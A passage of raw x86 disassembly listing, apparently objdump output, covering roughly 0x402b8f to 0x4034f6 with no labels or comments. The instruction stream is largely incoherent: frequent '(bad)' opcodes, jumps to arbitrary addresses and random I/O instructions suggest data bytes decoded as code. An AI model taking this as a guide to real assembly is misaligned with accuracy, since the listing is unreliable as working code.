  402b8f:	sbb    DWORD PTR [eax],ebp
  402b91:	add    al,0xcf
  402b93:	mov    bl,0xa7
  402b95:	add    al,0xa7
  402b97:	sti    
  402b98:	test   al,0x58
  402b9a:	xchg   ebp,eax
  402b9b:	jnp    0x402b2e
  402b9d:	pop    esp
  402b9e:	push   0xf4042819
  402ba3:	fidiv  DWORD PTR [ecx+0x4a02a7ca]
  402ba9:	ss mov esi,0x642ce941
  402baf:	xor    eax,0x33d9e072
  402bb4:	push   ss
  402bb5:	shl    edx,1
  402bb7:	cli    
  402bb8:	sbb    BYTE PTR [edi+0x73e90269],0x9c
  402bbf:	ret    0x8dc
  402bc2:	add    BYTE PTR [edi+edi*4],ch
  402bc5:	mov    edx,0x7ce8fa65
  402bca:	sar    dl,cl
  402bcc:	js     0x402c4b
  402bce:	outs   dx,DWORD PTR ds:[esi]
  402bcf:	jb     0x402c43
  402bd1:	push   edi
	...
  402be6:	add    BYTE PTR [ebx-0x12fd6e5],dh
  402bec:	into   
  402bed:	shl    DWORD PTR ss:[eax],1
  402bf0:	jb     0x402c2d
  402bf2:	mov    ds:0x3e68217,al
  402bf7:	fwait
  402bf8:	jmp    0x854f60b2
  402bfd:	das    
  402bfe:	add    al,0xa7
  402c00:	sti    
  402c01:	sub    BYTE PTR [edi-0x60],dl
  402c04:	das    
  402c05:	mov    ds:0xf1c3ee31,al
  402c0a:	add    ebp,DWORD PTR [esi]
  402c0c:	or     BYTE PTR [eax],al
  402c0e:	push   0xffffffdd
  402c10:	add    eax,0x11b17eb
  402c15:	add    cl,ch
  402c17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c18:	das    
  402c19:	pop    ebx
  402c1a:	aas    
  402c1b:	sbb    al,0xc4
  402c1d:	or     cl,ch
  402c1f:	cdq    
  402c20:	jnp    0x402c0e
  402c22:	bound  esp,QWORD PTR [ecx-0x6]
  402c25:	or     ch,BYTE PTR [ecx+0x1800558]
  402c2b:	mov    ds:0xa4710955,eax
  402c30:	add    al,BYTE PTR [eax]
  402c32:	jmp    0xe944f024
  402c37:	ret    
  402c38:	mov    al,0xeb
  402c3a:	mul    BYTE PTR [ebx+ecx*1]
  402c3d:	pop    esp
  402c3e:	sbb    eax,0xbe3882a8
  402c43:	icebp  
  402c44:	add    eax,0x2a4e8ba
  402c49:	add    BYTE PTR [edx+0x0],dl
	...
  402c5f:	add    BYTE PTR [ecx-0x5b16ff78],ah
  402c65:	add    al,BYTE PTR [eax+0x69]
  402c68:	pushf  
  402c69:	add    dh,BYTE PTR [ebp+0x4d]
  402c6c:	jecxz  0x402c2e
  402c6e:	leave  
  402c6f:	sub    esp,DWORD PTR [eax+0x70625502]
  402c75:	ss push esi
  402c77:	mov    edx,0xec0c47cb
  402c7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c7d:	push   es
  402c7e:	add    cl,ch
  402c80:	cmc    
  402c81:	loop   0x402cd3
  402c83:	inc    ecx
  402c84:	cli    
  402c85:	(bad)  
  402c86:	jmp    FWORD PTR [esi]
  402c88:	stos   DWORD PTR es:[edi],eax
  402c89:	retf   0x418b
  402c8c:	mov    ds:0xd9720857,eax
  402c91:	(bad)  
  402c92:	jmp    0x7020:0xb3c48eb
  402c99:	pop    es
  402c9a:	add    BYTE PTR [eax],0xe8
  402c9d:	iret   
  402c9e:	je     0x402c95
  402ca0:	cmc    
  402ca1:	mov    BYTE PTR [edx+eax*1+0x62],dh
  402ca5:	or     BYTE PTR [ebx],ch
  402ca7:	shl    BYTE PTR [esp+eax*4-0x37],0x75
  402cac:	lock dec ecx
  402cae:	ret    
  402caf:	pop    ebx
  402cb0:	cwde   
  402cb1:	sbb    eax,0x1c6c2c9
  402cb6:	push   ebx
  402cb7:	push   esi
  402cb8:	aaa    
  402cb9:	sti    
  402cba:	(bad)  
  402cbb:	dec    esi
  402cbd:	push   ecx
  402cbe:	xor    edx,edx
  402cc0:	pop    esi
  402cc1:	icebp  
  402cc2:	ficom  DWORD PTR [eax+0x0]
	...
  402cd8:	add    BYTE PTR [edx],ch
  402cda:	push   edi
  402cdb:	movzx  edi,dh
  402cde:	push   esi
  402cdf:	cmp    al,0x2b
  402ce1:	push   ds
  402ce2:	sub    al,0x6
  402ce4:	nop
  402ce5:	or     eax,0xbd903ec1
  402cea:	repnz cs nop
  402ced:	mov    bl,0x4
  402cef:	nop
  402cf0:	or     DWORD PTR [ebp+edi*8-0x71],0x43
  402cf5:	cmp    dh,cl
  402cf7:	(bad)  
  402cf8:	jl     0x402c7e
  402cfa:	std    
  402cfb:	cmp    BYTE PTR [eax+0x403fa79],dl
  402d01:	dec    ebp
  402d02:	xchg   ecx,eax
  402d03:	inc    ebx
  402d04:	cmp    al,0xf
  402d06:	push   ecx
  402d07:	jl     0x402d14
  402d09:	mov    edx,0x407f9018
  402d0e:	in     eax,dx
  402d0f:	inc    eax
  402d10:	nop
  402d11:	dec    ebp
  402d12:	xchg   ecx,eax
  402d13:	inc    ebx
  402d14:	cmp    al,0x6f
  402d16:	push   ecx
  402d17:	jl     0x402d23
  402d19:	cmp    bh,BYTE PTR [ebx]
  402d1b:	nop
  402d1c:	jg     0x402d61
  402d1e:	in     eax,dx
  402d1f:	inc    esi
  402d20:	add    ebx,esi
  402d22:	inc    ecx
  402d23:	rol    edx,0x0
  402d26:	jecxz  0x402cd9
  402d28:	shl    DWORD PTR [edi-0x1a74f9df],0xab
  402d2f:	mov    ebx,0x3ad30fc1
  402d34:	nop
  402d35:	sub    al,0x10
  402d37:	je     0x402d97
  402d39:	dec    esp
  402d3a:	sbb    BYTE PTR [ecx],bh
  402d3c:	mov    eax,DWORD PTR [eax]
	...
  402d52:	sti    
  402d53:	addr16 ss push esi
  402d56:	jecxz  0x402da7
  402d58:	pop    eax
  402d59:	or     BYTE PTR [edi],dh
  402d5b:	push   eax
  402d5c:	push   eax
  402d5d:	adc    BYTE PTR [edi],dh
  402d5f:	pusha  
  402d60:	inc    eax
  402d61:	or     al,0x37
  402d63:	call   0x2bc61112
  402d68:	xor    al,0x90
  402d6a:	iret   
  402d6b:	or     bh,cl
  402d6d:	push   DWORD PTR [eax+0x29c9882a]
  402d73:	jecxz  0x402d0e
  402d75:	ror    DWORD PTR [edi-0x7abc8c2e],0xa2
  402d7c:	jae    0x402dd7
  402d7e:	aaa    
  402d7f:	pop    ecx
  402d80:	lds    eax,FWORD PTR [edi+esi*1]
  402d83:	pop    ecx
  402d84:	fadd   QWORD PTR [edi+edx*1]
  402d87:	add    eax,0x992c90ae
  402d8c:	jae    0x402dec
  402d8e:	shl    al,1
  402d90:	mov    esp,0x38d99bc2
  402d95:	mov    edx,DWORD PTR [ebx+0x5b]
  402d98:	(bad)  
  402d99:	in     al,dx
  402d9a:	pop    ecx
  402d9b:	sub    eax,0x107c53ce
  402da0:	add    BYTE PTR [ebp+0x4b],0x8a
  402da4:	pop    ebx
  402da5:	pop    ebx
  402da6:	mov    ds,WORD PTR [edx-0x768d00fd]
  402dac:	sbb    al,0x41
  402dae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402daf:	inc    ecx
  402db0:	es (bad) 
  402db2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402db3:	fsqrt  
  402db5:	mov    edi,0x0
	...
  402dca:	add    BYTE PTR [edx-0x6d3134fe],bl
  402dd0:	repnz sbb eax,0xea58a358
  402dd6:	pop    ecx
  402dd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dd8:	retf   
  402dd9:	xchg   esp,eax
  402dda:	sti    
  402ddb:	add    DWORD PTR [esi+0x5],edx
  402dde:	fist   DWORD PTR [ebx-0x63fc163c]
  402de4:	ret    0x47c
  402de7:	fs retf 
  402de9:	je     0x402dba
  402deb:	iret   
  402dec:	fld    TBYTE PTR [esp+eax*1-0x23e0859]
  402df3:	sub    eax,esi
  402df5:	jmp    0x64bdd4fd
  402dfa:	rol    ecx,1
  402dfc:	retf   
  402dfd:	(bad)  
  402dfe:	xor    al,0x4f
  402e00:	push   es
  402e01:	call   0x941ad509
  402e06:	enter  0x2a7,0xe2
  402e0a:	ret    
  402e0b:	mov    al,0x86
  402e0d:	push   ebp
  402e0e:	add    al,0xa7
  402e10:	add    bl,ah
  402e12:	pop    es
  402e13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e14:	add    ch,cl
  402e16:	cld    
  402e17:	and    DWORD PTR [ecx+0x58a703e9],esp
  402e1d:	jmp    0x800f50a0
  402e22:	int    0x70
  402e24:	xor    al,BYTE PTR [ecx-0x16fd9c73]
  402e2a:	jle    0x402e56
  402e2c:	iret   
  402e2d:	addr16 int 0x0
	...
  402e44:	pop    eax
  402e45:	xor    dl,BYTE PTR [ecx+0x44]
  402e48:	push   ecx
  402e49:	retf   
  402e4a:	push   esi
  402e4b:	stc    
  402e4c:	or     BYTE PTR [ebp-0x13],dl
  402e4f:	pop    ebx
  402e50:	inc    esi
  402e51:	sbb    ch,BYTE PTR [eax+0x3a852a03]
  402e57:	into   
  402e58:	xor    bl,cl
  402e5a:	add    BYTE PTR [ecx+0x2ef6a94c],bl
  402e60:	repnz retf 0xf175
  402e64:	aam    0xda
  402e66:	and    al,0x16
  402e68:	loop   0x402e34
  402e6a:	jmp    0x402e52
  402e6c:	fist   DWORD PTR [eax+ecx*1+0x5c]
  402e70:	sub    bh,cl
  402e72:	inc    BYTE PTR [esi]
  402e74:	jmp    0xffca:0xd93ee831
  402e7b:	pusha  
  402e7c:	and    dh,bl
  402e7e:	(bad)  
  402e7f:	out    dx,al
  402e80:	repz push edi
  402e82:	add    BYTE PTR [ebx-0x5d],dl
  402e85:	pop    eax
  402e86:	add    dl,BYTE PTR [ebx-0x55]
  402e89:	pop    eax
  402e8a:	add    eax,DWORD PTR [ecx-0x5d]
  402e8d:	add    al,BYTE PTR [eax]
  402e8f:	test   eax,0xc7ec94f3
  402e94:	jmp    0x402e60
  402e96:	call   0x421668
  402e9b:	pusha  
  402e9c:	popa   
  402e9d:	retf   0x3540
  402ea0:	xchg   ebx,eax
  402ea1:	leave  
  402ea2:	jne    0x402e9d
  402ea4:	imul   edx,DWORD PTR [eax+0xc],0xffffff9e
	...
  402ebc:	add    cl,bh
  402ebe:	retf   0xc7e8
  402ec1:	push   0xffffffca
  402ec3:	jmp    DWORD PTR [edx+0x4c]
  402ec6:	retf   0x8175
  402ec9:	pop    esp
  402eca:	lods   eax,DWORD PTR ds:[esi]
  402ecb:	ret    
  402ecc:	jmp    0xfd1b2c75
  402ed1:	outs   dx,DWORD PTR ds:[esi]
  402ed2:	leave  
  402ed3:	mov    ch,0x7d
  402ed5:	jb     0x402ea1
  402ed7:	call   DWORD PTR [ecx-0x57]
  402eda:	mov    esi,0x9063e900
  402edf:	in     al,dx
  402ee0:	push   edi
  402ee1:	pop    ebx
  402ee2:	retf   0x21e8
  402ee5:	push   esi
  402ee6:	retf   0xff
  402ee9:	mov    ch,0xc2
  402eeb:	pop    ebx
  402eec:	leave  
  402eed:	jl     0x402eb8
  402eef:	call   DWORD PTR [ebp+eax*8-0x57]
  402ef3:	add    esp,0xffffb7e2
  402ef9:	pop    ebp
  402efa:	mov    bh,0x75
  402efc:	or     al,0xb1
  402efe:	xor    BYTE PTR [eax],cl
  402f00:	push   0x40ed55
  402f05:	mov    cl,0xf0
  402f07:	outs   dx,DWORD PTR ds:[esi]
  402f08:	sub    DWORD PTR [edi+0x6],ecx
  402f0b:	call   0xfffe2ac9
  402f10:	or     edi,DWORD PTR [esi-0x31257b3a]
  402f16:	add    eax,0x4be52b00
  402f1b:	test   edi,ebp
  402f1d:	lock mov ebp,0x50ff
	...
  402f33:	add    BYTE PTR [eax],al
  402f35:	add    BYTE PTR [esi+0x2],ah
  402f38:	add    DWORD PTR [eax],eax
  402f3a:	into   
  402f3b:	lods   eax,DWORD PTR ds:[esi]
  402f3c:	in     al,0xc3
  402f3e:	into   
  402f3f:	add    eax,0x49c1c00b
  402f44:	mov    ebp,0x3d05be00
  402f49:	add    al,0x8f
  402f4b:	add    eax,0x71090f00
  402f50:	add    BYTE PTR [eax],al
  402f52:	jle    0x402f9e
  402f54:	inc    ebp
  402f55:	cld    
  402f56:	into   
  402f57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f58:	mov    edx,0x8dbd31e9
  402f5d:	test   DWORD PTR [ecx],edx
  402f5f:	mov    esp,0xa68effff
  402f64:	dec    edi
  402f65:	std    
  402f66:	icebp  
  402f67:	mov    ebp,0xe15bc00b
  402f6c:	addr16 loope 0x402f25
  402f6f:	aas    
  402f70:	add    BYTE PTR [ebp-0x15235],cl
  402f76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f77:	xor    BYTE PTR [eax+ebp*8],dh
  402f7a:	dec    edi
  402f7b:	cs retf 
  402f7d:	(bad)  
  402f7e:	cmp    BYTE PTR [esi-0x33c0b005],al
  402f84:	sar    edi,1
  402f86:	sub    BYTE PTR [ebx+edi*8-0x2],al
  402f8a:	call   0xcb21:0x88578e3
  402f91:	push   DWORD PTR [edi-0xd]
  402f94:	mov    ecx,0x33f008f5
  402f99:	inc    DWORD PTR [eax]
	...
  402faf:	jp     0x402fa8
  402fb1:	xor    ebp,eax
  402fb3:	xor    esp,0x1b9cffca
  402fb9:	push   eax
  402fba:	push   ebx
  402fbb:	call   0x128f705
  402fc0:	add    cl,bl
  402fc2:	jmp    FWORD PTR [esi]
  402fc4:	push   ss
  402fc5:	int3   
  402fc6:	adc    DWORD PTR [edx-0x1d],0x3
  402fca:	je     0x403031
  402fcc:	pop    esi
  402fcd:	inc    eax
  402fce:	hlt    
  402fcf:	push   edi
  402fd0:	mov    eax,0xf0cffc50
  402fd5:	mov    edi,0xc35ea700
  402fda:	js     0x403051
  402fdc:	nop
  402fdd:	push   eax
  402fde:	hlt    
  402fdf:	(bad)  
  402fe0:	fadd   st(6),st
  402fe2:	add    BYTE PTR [edi-0x368b3c2c],ah
  402fe8:	or     ebx,ecx
  402fea:	jne    0x402f7b
  402fec:	add    BYTE PTR ds:0x7e7980f2,0xd8
  402ff3:	fild   WORD PTR [eax-0x162b07b0]
  402ff9:	fld    TBYTE PTR [esi*2-0x250035af]
  403000:	dec    ebp
  403001:	(bad)  
  403003:	gs add ebp,ecx
  403006:	add    ebx,DWORD PTR [esi+edi*1]
  403009:	in     eax,dx
  40300a:	retf   0xcad2
  40300d:	add    cx,WORD PTR [edi-0x46]
  403011:	pop    eax
  403012:	retf   0x0
	...
  403025:	add    BYTE PTR [eax],al
  403027:	add    BYTE PTR [eax],bh
  403029:	enter  0xc7bc,0x3f
  40302d:	sbb    DWORD PTR [eax-0x36],edx
  403030:	sub    BYTE PTR [edx+ebp*1+0x2e],bh
  403034:	out    dx,al
  403035:	(bad)
  403039:	jnp    0x403050
  40303b:	xor    bl,BYTE PTR [esi+eax*2]
  40303e:	icebp  
  40303f:	fidiv  WORD PTR [esi+0x2d01022f]
  403045:	inc    eax
  403046:	call   0x697fd0c6
  40304b:	or     ah,BYTE PTR [edi+0x5829f44d]
  403051:	aas    
  403052:	imul   ecx,DWORD PTR [edx],0x83034e87
  403058:	cwde   
  403059:	cmc    
  40305a:	pop    esp
  40305b:	fbld   TBYTE PTR [edi]
  40305d:	or     bl,dh
  40305f:	dec    edi
  403060:	mov    DWORD PTR [edx-0x54cb04ea],0xc7af4762
  40306a:	cmp    al,0xfc
  40306c:	enter  0xab7d,0x4
  403070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403071:	xor    DWORD PTR [ecx+0x69201904],0x48
  403078:	ffreep st(7)
  40307a:	leave  
  40307b:	dec    edi
  40307c:	mov    edx,0x880c1d82
  403081:	cmc    
  403082:	sbb    al,0xfa
  403084:	add    BYTE PTR [edi-0x2f],al
  403087:	enter  0x4ead,0xee
  40308b:	add    DWORD PTR [eax],0x0
	...
  40309e:	add    BYTE PTR [eax],al
  4030a0:	add    bl,dh
  4030a2:	or     bh,BYTE PTR [esi-0x5]
  4030a5:	repz (bad) 
  4030a7:	jmp    FWORD PTR [esi-0x1600f519]
  4030ad:	jnp    0x4030b3
  4030af:	jmp    0x40309c
  4030b1:	jae    0x403069
  4030b3:	pop    edi
  4030b4:	xor    BYTE PTR [ecx-0x2],ah
  4030b7:	(bad)  
  4030b8:	mov    ebx,0x2583d6c3
  4030bd:	inc    edi
  4030be:	xor    eax,DWORD PTR [ebx+0x41182d04]
  4030c4:	jmp    0x6a527f6d
  4030c9:	test   al,0xf4
  4030cb:	cs test al,0xa4
  4030ce:	add    dh,BYTE PTR [eax+esi*8+0x2b]
  4030d2:	add    eax,0x265cffa
  4030d7:	add    BYTE PTR [edi+eiz*4+0x3db2c01b],bl
  4030de:	les    ecx,FWORD PTR [eax]
  4030e0:	jmp    0xa507dc78
  4030e5:	fadd   DWORD PTR [ecx]
  4030e7:	add    cl,ch
  4030e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030ea:	jne    0x403131
  4030ec:	icebp  
  4030ed:	xchg   esp,eax
  4030ee:	(bad)  
  4030ef:	jne    0x4030e2
  4030f1:	jb     0x4030f5
  4030f3:	push   esp
  4030f5:	into   
  4030f6:	pop    ss
  4030f7:	inc    ecx
  4030f8:	jmp    0x32b4b7c0
  4030fd:	fisttp DWORD PTR [edi-0x3e]
  403100:	jmp    0x6d10aca9
	...
  403119:	add    BYTE PTR [ecx-0x32],ch
  40311c:	push   eax
  40311d:	inc    ebx
  40311e:	retf   
  40311f:	xor    bh,bh
  403121:	aam    0x6a
  403123:	adc    eax,0x8693e941
  403128:	je     0x4030fa
  40312a:	addr16 inc eax
  40312c:	in     al,0xe8
  40312e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40312f:	add    al,BYTE PTR [eax]
  403131:	mov    gs,ecx
  403133:	retf   0x8f
  403136:	ret    
  403137:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403138:	push   DWORD PTR [ebp-0x16]
  40313b:	dec    edx
  40313c:	inc    ebp
  40313d:	in     al,dx
  40313e:	int    0x3c
  403140:	or     al,0x0
  403142:	push   edx
  403143:	leave  
  403144:	mov    BYTE PTR [ebp-0x12],0xff
  403148:	(bad)  
  403149:	(bad)  
  40314a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40314c:	pop    es
  40314d:	(bad)  
  40314e:	adc    esi,DWORD PTR [edx+0x24e0000]
  403154:	push   0x0
  403156:	push   esp
  403157:	add    ch,BYTE PTR [edx+0x10]
  40315a:	mov    ebx,0xe450e404
  40315f:	add    edi,edi
  403161:	jne    0x403135
  403163:	mov    edx,0x40f91215
  403168:	add    BYTE PTR [ebx],cl
  40316a:	mov    esi,0x8d430135
  40316f:	cmp    al,0xf4
  403171:	add    BYTE PTR [edx],dl
  403173:	retf   0x75fe
  403176:	repnz test al,0x9a
  403179:	sar    esi,0x1
  40317c:	mov    eax,ebx
	...
  403192:	add    BYTE PTR ds:0xce08c289,dh
  403198:	adc    al,0x8b
  40319a:	in     al,dx
  40319b:	leave  
  40319c:	xor    ecx,DWORD PTR [eax]
  40319e:	call   0x40f0f5
  4031a3:	mov    cs,WORD PTR [esi]
  4031a5:	call   0xfffe104a
  4031aa:	push   eax
  4031ab:	jmp    0xd69039e3
  4031b0:	lahf   
  4031b1:	rol    DWORD PTR [eax],0x8e
  4031b4:	sbb    ecx,ecx
  4031b6:	ret    0x182
  4031b9:	push   ebp
  4031ba:	mov    edi,DWORD PTR [edx]
  4031bc:	add    esp,0x7d81cdfc
  4031c2:	or     BYTE PTR [edi-0x33f8af25],ah
  4031c8:	fwait
  4031c9:	sub    ecx,ecx
  4031cb:	xlat   BYTE PTR gs:[ebx]
  4031cd:	add    ebp,DWORD PTR [ebx]
  4031cf:	dec    esp
  4031d0:	icebp  
  4031d1:	add    ebp,DWORD PTR [edx-0x59]
  4031d4:	add    DWORD PTR [edx+ebp*2],eax
  4031d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031d8:	add    edi,eax
  4031da:	(bad)  
  4031db:	fcmovbe st,st(3)
  4031dd:	pop    ecx
  4031de:	add    BYTE PTR [ebp+0x66c4dbdb],bh
  4031e4:	fild   DWORD PTR [ebx]
  4031e6:	or     esp,DWORD PTR [edi-0x51]
  4031e9:	adc    cl,BYTE PTR [ecx+0x75c73fea]
  4031ef:	sub    esi,DWORD PTR [ebx]
  4031f1:	lock and BYTE PTR cs:[ebx+edi*8],cl
  4031f6:	mov    edi,0x0
	...
  40320b:	add    BYTE PTR [ebx+0x7dd87aff],dl
  403211:	fistp  DWORD PTR [ecx+0x0]
  403214:	or     BYTE PTR [esi-0x39],ch
  403217:	push   ebx
  403218:	(bad)  
  403219:	in     al,dx
  40321a:	(bad)  
  40321b:	jne    0x4031cc
  40321d:	add    DWORD PTR [ebx],0x6cf3a76a
  403223:	shl    DWORD PTR [edi+0x5abffadb],0xe3
  40322a:	xor    ch,al
  40322c:	mov    esi,0x7cffc6cb
  403231:	sar    BYTE PTR [edx-0x3d],0x6c
  403235:	xchg   edx,eax
  403236:	rol    DWORD PTR [edi+eiz*4],0x6
  40323a:	jnp    0x403228
  40323c:	and    al,0x9f
  40323e:	xlat   BYTE PTR ds:[ebx]
  40323f:	push   eax
  403240:	push   esp
  403241:	jmp    0xc40:0x50515731
  403248:	xor    ah,BYTE PTR [edx-0x7d]
  40324b:	add    BYTE PTR [edi+0x6a1478d9],ah
  403251:	add    ebp,ecx
  403253:	add    esp,DWORD PTR [edi+0x2cab7202]
  403259:	mov    ebx,0x79a1dba8
  40325e:	and    al,0xd8
  403260:	sbb    al,0x46
  403262:	icebp  
  403263:	add    ch,BYTE PTR [esi-0x43]
  403266:	out    0x83,al
  403268:	and    al,0xe0
  40326a:	mov    dh,0x1a
  40326c:	pop    esp
  40326d:	xor    BYTE PTR [edx+0xb],0x0
	...
  403285:	aad    0xf4
  403287:	jmp    0xe9834256
  40328c:	add    esp,DWORD PTR [edi+0x3f022a17]
  403292:	les    esp,FWORD PTR [edi+edx*8+0x79012c1e]
  403299:	mov    dl,0xd2
  40329b:	es std 
  40329d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40329e:	pop    ds
  40329f:	lods   al,BYTE PTR ds:[esi]
  4032a0:	pop    esi
  4032a1:	loopne 0x4032df
  4032a3:	in     eax,0x7c
  4032a5:	cmp    al,0xb6
  4032a7:	push   ss
  4032a8:	mov    esi,0xa71efa61
  4032ad:	cmp    eax,0xab3d2e6b
  4032b2:	dec    esp
  4032b3:	mov    ch,0x11
  4032b5:	xchg   edi,eax
  4032b6:	ret    
  4032b7:	jl     0x403290
  4032b9:	call   0x6ab9240b
  4032be:	rcr    BYTE PTR [ecx-0x16fd4d25],cl
  4032c4:	add    edx,ebx
  4032c6:	mov    ebp,ebp
  4032c8:	add    esp,DWORD PTR [edi-0x68b88dfe]
  4032ce:	iret   
  4032cf:	mov    WORD PTR [esi],fs
  4032d1:	pop    eax
  4032d2:	sub    BYTE PTR [eax],dh
  4032d4:	sub    DWORD PTR [edi-0x47],ecx
  4032d7:	stos   DWORD PTR es:[edi],eax
  4032d8:	clc    
  4032d9:	test   al,0x2e
  4032db:	jb     0x4032b5
  4032dd:	and    al,0xbe
  4032df:	add    BYTE PTR [ebp+0x1a502bc9],dh
  4032e5:	aam    0x30
  4032e7:	mov    ebx,DWORD PTR [eax+eax*1]
	...
  4032fe:	(bad)  
  4032ff:	js     0x40337e
  403301:	icebp  
  403302:	(bad)  
  403303:	cmp    eax,0xc6b86010
  403308:	mov    esp,esi
  40330a:	out    dx,eax
  40330b:	and    eax,DWORD PTR [edx+esi*2]
  40330e:	mov    dl,0xfa
  403310:	mov    dl,BYTE PTR [esi]
  403312:	pop    edi
  403313:	js     0x40330e
  403315:	mov    edx,0xbafb1f6e
  40331a:	pop    esi
  40331b:	jne    0x4032a1
  40331d:	out    dx,al
  40331e:	fcomp  QWORD PTR [esi-0x359c996]
  403324:	shr    BYTE PTR [ecx],0x3a
  403327:	add    bl,al
  403329:	bound  ebx,QWORD PTR [esi+0xf]
  40332c:	stc    
  40332d:	or     bl,BYTE PTR [ebx+0xf]
  403330:	stc    
  403331:	ins    BYTE PTR es:[edi],dx
  403332:	xchg   edi,eax
  403333:	jmp    0x40338a
  403335:	jle    0x403391
  403337:	fiadd  DWORD PTR [ebx]
  403339:	xchg   edi,eax
  40333a:	adc    dl,al
  40333c:	ret    0xa7f5
  40333f:	mov    dl,0x8b
  403341:	and    DWORD PTR [esi-0x69ecdc39],edx
  403347:	(bad)  
  403348:	lea    ebx,[ebp-0x6]
  40334b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40334c:	jo     0x403317
  40334e:	mov    bh,bh
  403350:	dec    ebp
  403351:	icebp  
  403352:	in     eax,0xc0
  403354:	adc    edx,ebp
  403356:	push   ds
  403357:	ja     0x403353
  403359:	mov    edx,0x1af91edc
  40335e:	(bad)  [esp+ebx*4-0x2]
	...
  403376:	add    dl,bl
  403378:	mov    bl,0xbd
  40337a:	test   al,0xa7
  40337c:	and    al,0xc
  40337e:	test   al,0xe7
  403380:	jmp    0x403384
  403382:	add    BYTE PTR [edi],al
  403384:	dec    edx
  403385:	stc    
  403386:	xor    esp,DWORD PTR [ebx+eiz*8-0x6]
  40338a:	xor    edx,DWORD PTR [ecx+edi*1-0x7c]
  40338e:	pop    es
  40338f:	adc    DWORD PTR [edi+0x7df57b],esi
  403395:	adc    cl,al
  403397:	dec    esi
  403398:	mov    edi,0xcb05c302
  40339d:	xor    edi,ecx
  40339f:	pop    ebp
  4033a0:	into   
  4033a1:	xor    edi,ecx
  4033a3:	repz xor DWORD PTR [edi],edx
  4033a6:	sub    cl,BYTE PTR [eax]
  4033a8:	aas    
  4033a9:	inc    edi
  4033aa:	add    edi,DWORD PTR [eax+0x72c2c0b2]
  4033b0:	add    edx,eax
  4033b2:	mov    eax,esi
  4033b4:	adc    bh,bl
  4033b6:	and    eax,esp
  4033b8:	adc    bh,bl
  4033ba:	(bad)  
  4033bb:	ret    0x12b6
  4033be:	inc    esi
  4033bf:	mov    ds,WORD PTR [esi-0x3ab9b1fd]
  4033c5:	rcl    DWORD PTR [ecx],0xd
  4033c8:	jl     0x403355
  4033ca:	cli    
  4033cb:	sbb    eax,0xdf923ce
  4033d0:	into   
  4033d1:	lea    ebx,[ecx+eiz*4-0x5cb96afb]
  4033d8:	add    bl,BYTE PTR [esi+0x1c]
	...
  4033ef:	add    bh,cl
  4033f1:	ret    0x316
  4033f4:	mov    bh,0x3a
  4033f6:	stc    
  4033f7:	xor    esp,DWORD PTR [edx+eiz*8+0x38a433fa]
  4033fe:	test   BYTE PTR [edi],al
  403400:	mov    dh,0x2d
  403402:	sub    BYTE PTR [ecx-0x43],0xff
  403406:	pop    ds
  403407:	sar    esi,0xd
  40340a:	add    eax,ebx
  40340c:	xor    eax,0xa7f93381
  403411:	or     al,0xbc
  403413:	xor    ebp,DWORD PTR [esi-0x7e867a2]
  403419:	or     BYTE PTR [eax-0x75],0xa4
  40341d:	sbb    eax,ebp
  40341f:	shl    BYTE PTR [ebp-0x59],0x6
  403423:	rcr    BYTE PTR [ebx+esi*2],1
  403426:	idiv   edx
  403428:	les    esp,FWORD PTR [ebp-0x9]
  40342b:	cli    
  40342c:	xor    ch,BYTE PTR [edi]
  40342e:	adc    esi,DWORD PTR [ecx+0x3c398dc]
  403434:	loope  0x4033f9
  403436:	(bad)
  40343a:	int    0x8b
  40343c:	pop    ebp
  40343d:	jl     0x4033fa
  40343f:	and    ebx,DWORD PTR [esi+0x7c]
  403442:	mov    ebx,0x81d0338d
  403447:	xlat   BYTE PTR ds:[ebx]
  403448:	jmp    0x40347c
  40344a:	pop    es
  40344b:	pop    esi
  40344c:	xchg   ebx,eax
  40344d:	jmp    0xf98e:0xf2a416c6
	...
  403468:	add    BYTE PTR [ebp+edx*2-0x19],dh
  40346c:	cli    
  40346d:	je     0x4034b4
  40346f:	xchg   ecx,eax
  403470:	test   BYTE PTR [eax-0x736feaf3],ch
  403476:	lods   al,BYTE PTR ds:[esi]
  403477:	dec    ecx
  403478:	xor    dh,ah
  40347a:	jmp    0x33bf:0x33e4030a
  403481:	dec    bl
  403483:	mov    ebx,0x9825fe33
  403488:	pop    ss
  403489:	adc    al,0x9a
  40348b:	fwait
  40348c:	std    
  40348d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40348e:	mov    eax,ds:0xaee5c0f7
  403493:	push   es
  403494:	shr    BYTE PTR [ebx+esi*4],1
  403497:	idiv   dl
  403499:	test   BYTE PTR [ebp+0x21afaf6],dh
  40349f:	jne    0x4034b3
  4034a1:	xor    DWORD PTR [ebp+0x60],eax
  4034a4:	push   0xffffffa4
  4034a6:	push   eax
  4034a7:	adc    ebp,eax
  4034a9:	out    0x12,al
  4034ab:	jmp    0xc4bb:0xfabc1ccd
  4034b2:	mov    ecx,0x9f2abbfa
  4034b7:	(bad)  
  4034b8:	in     al,0xa8
  4034ba:	jbe    0x4034dc
  4034bc:	pop    es
  4034bd:	jmp    0x9a06dcc0
  4034c2:	add    eax,eax
  4034c4:	mov    ?,WORD PTR [esi-0xc]
  4034c7:	xchg   ecx,eax
  4034c8:	out    0x6e,al
  4034ca:	hlt    
  4034cb:	(bad)  
  4034cc:	nop
	...
  4034e1:	add    BYTE PTR [ebx],ah
  4034e3:	or     BYTE PTR [ebx],cl
  4034e5:	jmp    0x4a2aedac
  4034ea:	mov    ds:0xa408a9c1,eax
  4034ef:	ret    
  4034f0:	bound  edi,QWORD PTR [esi-0x42f5456c]
  4034f6:	je     0x4034b3
